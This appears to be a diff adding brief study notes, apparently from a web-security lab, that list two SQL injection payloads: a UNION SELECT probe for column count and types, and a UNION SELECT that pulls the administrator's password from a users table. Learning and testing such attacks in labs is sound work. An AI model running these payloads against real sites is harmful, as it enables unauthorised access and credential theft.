@@ -1,0 +1,5 @@
+step 1: find number of columns and their data types 
+injection used : ' union select null,'a' --
+
+step 2: joining the passwords into table-1 using union 
+injection used : 'union select null,password from users where usernames='administrator'
